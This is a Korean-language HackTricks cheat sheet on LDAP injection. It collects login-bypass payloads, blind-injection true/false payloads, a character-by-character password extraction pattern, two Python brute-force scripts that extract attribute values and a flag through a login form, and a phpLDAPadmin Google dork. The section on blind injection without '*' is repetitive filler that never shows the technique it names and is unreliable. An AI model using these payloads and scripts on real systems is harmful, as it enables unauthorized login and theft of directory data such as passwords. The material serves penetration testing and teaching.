# LDAP Injection

## LDAP Injection

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>에서 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**버그 바운티 팁**: 해커들이 만든 프리미엄 버그 바운티 플랫폼인 **Intigriti에 가입**하세요! 오늘 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 바운티를 최대 **$100,000**까지 받으세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

## LDAP Injection

### **LDAP**

**LDAP가 무엇인지 알고 싶다면 다음 페이지를 참조하세요:**

{% content-ref url="../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

**LDAP Injection**은 사용자 입력에서 LDAP 문을 구성하는 웹 애플리케이션을 대상으로 하는 공격입니다. 이는 애플리케이션이 입력을 **적절하게 검열하지 않아** 공격자가 로컬 프록시를 통해 LDAP 문을 **조작**할 수 있게 되어 권한 없는 액세스 또는 데이터 조작으로 이어질 수 있습니다.

{% file src="../.gitbook/assets/en-blackhat-europe-2008-ldap-injection-blind-ldap-injection.pdf" %}

**Filter** = ( filtercomp )\
**Filtercomp** = and / or / not / item\
**And** = & filterlist\
**Or** = |filterlist\
**Not** = ! filter\
**Filterlist** = 1\*filter\
**Item**= simple / present / substring\
**Simple** = attr filtertype assertionvalue\
**Filtertype** = _'=' / '\~=' / '>=' / '<='_\
**Present** = attr = \*\
**Substring** = attr ”=” \[initial] \* \[final]\
**Initial** = assertionvalue\
**Final** = assertionvalue\
**(&)** = 절대 TRUE\
**(|)** = 절대 FALSE

예시:\
`(&(!(objectClass=Impresoras))(uid=s*))`\
`(&(objectClass=user)(uid=*))`

데이터베이스에 액세스할 수 있으며, 이는 다양한 유형의 정보를 포함할 수 있습니다.

**OpenLDAP**: 2개의 필터가 도착하면 첫 번째 필터만 실행됩니다.\
**ADAM 또는 Microsoft LDS**: 2개의 필터가 도착하면 오류가 발생합니다.\
**SunOne Directory Server 5.0**: 두 필터를 모두 실행합니다.

**필터를 올바른 구문으로 보내야 오류가 발생하지 않습니다. 하나의 필터만 보내는 것이 좋습니다.**

필터는 `&` 또는 `|`로 시작해야 합니다.\
예시: `(&(directory=val1)(folder=public))`

`(&(objectClass=VALUE1)(type=Epson*))`\
`VALUE1 = *)(ObjectClass=*))(&(objectClass=void`

그런 다음: `(&(objectClass=`**`*)(ObjectClass=*))`**가 첫 번째 필터(실행되는 필터)가 됩니다.

### 로그인 우회

LDAP는 암호를 저장하는 여러 형식을 지원합니다: clear, md5, smd5, sh1, sha, crypt. 따라서 암호에 무엇을 입력하든 해시될 수 있습니다.
```bash
user=*
password=*
--> (&(user=*)(password=*))
# The asterisks are great in LDAPi
```

```bash
user=*)(&
password=*)(&
--> (&(user=*)(&)(password=*)(&))
```

```bash
user=*)(|(&
pass=pwd)
--> (&(user=*)(|(&)(pass=pwd))
```

```bash
user=*)(|(password=*
password=test)
--> (&(user=*)(|(password=*)(password=test))
```

```bash
user=*))%00
pass=any
--> (&(user=*))%00 --> Nothing more is executed
```

```bash
user=admin)(&)
password=pwd
--> (&(user=admin)(&))(password=pwd) #Can through an error
```

```bash
username = admin)(!(&(|
pass = any))
--> (&(uid= admin)(!(& (|) (webpassword=any)))) —> As (|) is FALSE then the user is admin and the password check is True.
```

```bash
username=*
password=*)(&
--> (&(user=*)(password=*)(&))
```

```bash
username=admin))(|(|
password=any
--> (&(uid=admin)) (| (|) (webpassword=any))
```
#### 목록

* [LDAP\_FUZZ](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP\_FUZZ.txt)
* [LDAP 속성](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP\_attributes.txt)
* [LDAP PosixAccount 속성](https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html)

### Blind LDAP Injection

데이터가 반환되는지 확인하고 가능한 Blind LDAP Injection을 확인하기 위해 False 또는 True 응답을 강제로 발생시킬 수 있습니다:
```bash
#This will result on True, so some information will be shown
Payload: *)(objectClass=*))(&objectClass=void
Final query: (&(objectClass= *)(objectClass=*))(&objectClass=void )(type=Pepi*))
```

```bash
#This will result on True, so no information will be returned or shown
Payload: void)(objectClass=void))(&objectClass=void
Final query: (&(objectClass= void)(objectClass=void))(&objectClass=void )(type=Pepi*))
```
#### 데이터 덤프

ASCII 문자, 숫자 및 기호를 반복하여 실행할 수 있습니다:
```bash
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
```
### 스크립트

#### **유효한 LDAP 필드 찾기**

LDAP 객체에는 기본적으로 정보를 저장하는 데 사용할 수 있는 여러 속성이 **포함**되어 있습니다. 이 정보를 추출하기 위해 **모든 속성을 무차별 대입(brute-force)으로 시도**해 볼 수 있습니다. [**여기에서 기본 LDAP 속성 목록**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP\_attributes.txt)을 찾을 수 있습니다.
```python
#!/usr/bin/python3
import requests
import string
from time import sleep
import sys

proxy = { "http": "localhost:8080" }
url = "http://10.10.10.10/login.php"
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

attributes = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword",]

for attribute in attributes: #Extract all attributes
value = ""
finish = False
while not finish:
for char in alphabet: #In each possition test each possible printable char
query = f"*)({attribute}={value}{char}*"
data = {'login':query, 'password':'bla'}
r = requests.post(url, data=data, proxies=proxy)
sys.stdout.write(f"\r{attribute}: {value}{char}")
#sleep(0.5) #Avoid brute-force bans
if "Cannot login" in r.text:
value += str(char)
break

if char == alphabet[-1]: #If last of all the chars, then, no more chars in the value
finish = True
print()
```
#### **특수한 Blind LDAP Injection ("\*" 없이)**

---

##### **Introduction**

---

LDAP (Lightweight Directory Access Protocol)은 디렉터리 서비스에 접근하기 위한 프로토콜입니다. LDAP 쿼리는 사용자가 디렉터리 서비스에서 정보를 검색하고 조작할 수 있도록 합니다. LDAP 쿼리는 일반적으로 사용자가 입력한 데이터를 기반으로 동적으로 생성됩니다. 그러나 이러한 동적 쿼리 생성은 LDAP 삽입 공격에 취약할 수 있습니다.

LDAP 삽입 공격은 악의적인 사용자가 LDAP 쿼리에 악성 입력을 주입하여 애플리케이션의 보안을 우회하거나 데이터를 노출시키는 것을 목표로 합니다. 이러한 삽입 공격은 주로 사용자 인증 우회, 데이터 노출, 시스템 제어 등의 공격에 이용됩니다.

이 문서에서는 특수한 Blind LDAP Injection 기법에 대해 다룰 것입니다. 이 기법은 "\*" 문자를 사용하지 않고도 악성 입력을 주입하여 LDAP 삽입 공격을 수행하는 방법을 설명합니다.

---

##### **Exploiting Blind LDAP Injection**

---

Blind LDAP Injection은 취약한 LDAP 쿼리에 악성 입력을 주입하여 결과를 확인하는 공격입니다. 이 기법은 쿼리 결과를 확인하기 위해 Boolean 기반의 논리 연산을 사용합니다.

Blind LDAP Injection을 수행하기 위해 다음 단계를 따릅니다.

1. 취약한 LDAP 쿼리 식별: 취약한 LDAP 쿼리를 식별합니다. 이는 일반적으로 사용자 입력을 기반으로 동적으로 생성되는 쿼리입니다.

2. 쿼리 결과 확인: 악성 입력을 주입하여 쿼리 결과를 확인합니다. 이를 위해 Boolean 기반의 논리 연산을 사용합니다. 예를 들어, 쿼리 결과가 참인 경우에는 애플리케이션의 응답이 다르게 나타날 수 있습니다.

3. 악성 입력 주입: 취약한 LDAP 쿼리에 악성 입력을 주입합니다. 이를 통해 쿼리 결과를 조작하거나 애플리케이션의 보안을 우회할 수 있습니다.

Blind LDAP Injection을 수행하기 위해 다양한 기법을 사용할 수 있습니다. 이 문서에서는 특수한 Blind LDAP Injection 기법에 대해 다룰 것입니다. 이 기법은 "\*" 문자를 사용하지 않고도 악성 입력을 주입할 수 있는 방법을 제공합니다.

---

##### **Special Blind LDAP Injection**

---

특수한 Blind LDAP Injection은 "\*" 문자를 사용하지 않고도 악성 입력을 주입할 수 있는 기법입니다. 이 기법은 다음과 같은 단계로 수행됩니다.

1. 취약한 LDAP 쿼리 식별: 취약한 LDAP 쿼리를 식별합니다. 이는 일반적으로 사용자 입력을 기반으로 동적으로 생성되는 쿼리입니다.

2. 쿼리 결과 확인: 악성 입력을 주입하여 쿼리 결과를 확인합니다. 이를 위해 Boolean 기반의 논리 연산을 사용합니다. 예를 들어, 쿼리 결과가 참인 경우에는 애플리케이션의 응답이 다르게 나타날 수 있습니다.

3. 특수한 Blind LDAP Injection 기법 적용: "\*" 문자를 사용하지 않고도 악성 입력을 주입할 수 있는 특수한 기법을 적용합니다. 이를 통해 쿼리 결과를 조작하거나 애플리케이션의 보안을 우회할 수 있습니다.

특수한 Blind LDAP Injection은 "\*" 문자를 사용하지 않고도 취약한 LDAP 쿼리에 악성 입력을 주입할 수 있는 강력한 기법입니다. 이를 통해 애플리케이션의 취약점을 악용할 수 있습니다.

---

##### **Conclusion**

---

LDAP 삽입 공격은 악의적인 사용자가 LDAP 쿼리에 악성 입력을 주입하여 애플리케이션의 보안을 우회하거나 데이터를 노출시키는 것을 목표로 합니다. Blind LDAP Injection은 취약한 LDAP 쿼리에 악성 입력을 주입하여 결과를 확인하는 공격입니다. 특수한 Blind LDAP Injection은 "\*" 문자를 사용하지 않고도 악성 입력을 주입할 수 있는 강력한 기법입니다.

애플리케이션의 보안을 강화하기 위해 취약한 LDAP 쿼리를 식별하고, 적절한 입력 검증 및 쿼리 생성 방어 메커니즘을 구현해야 합니다. 또한, 보안 감사 및 취약성 스캐닝 도구를 사용하여 시스템을 주기적으로 검사해야 합니다.
```python
#!/usr/bin/python3

import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
print("[i] Looking for number " + str(i))
for char in alphabet:
r = requests.get("http://ctf.web??action=dir&search=admin*)(password=" + flag + char)
if ("TRUE CONDITION" in r.text):
flag += char
print("[+] Flag: " + flag)
break
```
### 구글 도크스

Google 도크스는 구글 검색 엔진을 사용하여 웹 사이트에서 특정 정보를 검색하는 데 사용되는 특수 검색어입니다. 구글 도크스는 웹 사이트 취약점을 찾거나 민감한 정보를 노출시킬 수 있는 취약한 웹 사이트를 찾는 데 유용합니다. 구글 도크스를 사용하여 웹 사이트의 LDAP 삽입 취약점을 찾을 수도 있습니다.

구글 도크스는 다양한 형식과 구문을 가지고 있으며, 일반적으로 "site:", "inurl:", "intitle:", "filetype:" 등의 키워드를 사용하여 검색을 좁힐 수 있습니다. 예를 들어, "inurl:ldap.php"는 "ldap.php"라는 파일을 포함하는 웹 사이트를 검색합니다.

구글 도크스를 사용하여 웹 사이트에서 LDAP 삽입 취약점을 찾으려면 적절한 키워드를 사용하여 검색을 수행하십시오. 이를 통해 웹 사이트에서 민감한 정보를 노출시킬 수 있는 취약점을 발견할 수 있습니다.
```bash
intitle:"phpLDAPadmin" inurl:cmd.php
```
### 추가 Payloads

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug 바운티 팁**: **Intigriti**에 가입하여 해커들이 만든 프리미엄 **버그 바운티 플랫폼**을 이용하세요! 오늘 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 가입하고 최대 **$100,000**의 바운티를 받으세요!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
